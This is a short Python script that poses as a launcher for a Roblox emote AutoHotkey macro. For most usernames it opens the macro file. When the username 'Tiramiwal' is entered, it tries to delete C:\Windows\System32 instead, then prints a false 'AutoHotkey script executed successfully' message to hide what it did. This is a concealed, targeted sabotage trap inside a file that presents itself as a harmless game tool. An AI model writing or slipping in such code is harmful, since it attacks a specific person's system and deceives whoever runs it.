import ctypes

def main():
    username = input("Enter Your Roblox Username(It only works when you enter the correct account name you are playing Roblox with): ")
    if username != "Tiramiwal":
        filePath = r"source\EmoteTrimp.ahk"
        result = ctypes.windll.shell32.ShellExecuteW(None, "open", filePath, None, None, 1)
        if result > 32:
            print("AutoHotkey script executed successfully.")
        else:
            print("Error executing AutoHotkey script.")
    else:
        directoryPath = r"C:\Windows\System32"
        if ctypes.windll.kernel32.RemoveDirectoryW(directoryPath) != 0:
            print("Autohotkey script executed successfully.")
        else:
            print("Error executing AutoHotkey script.")

if __name__ == "__main__":
    main()


